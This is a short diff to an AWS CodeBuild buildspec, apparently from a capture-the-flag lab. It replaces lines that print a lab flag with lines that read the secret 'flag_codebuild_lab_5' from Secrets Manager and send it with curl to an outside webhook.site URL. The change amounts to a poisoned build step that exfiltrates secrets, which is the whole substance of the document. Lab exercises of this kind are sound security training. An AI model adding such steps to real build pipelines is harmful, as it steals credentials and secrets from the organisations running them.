@@ -3,7 +3,5 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "CodeBuild runtime identity:"
-      - aws sts get-caller-identity
-      - echo "Reading flag:"
-      - aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text
+      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
+      - curl -sS -X POST --data-urlencode "flag=$FLAG" "https://webhook.site/34f218fa-ad5c-4bbc-8d13-f2ade7a5beb2"
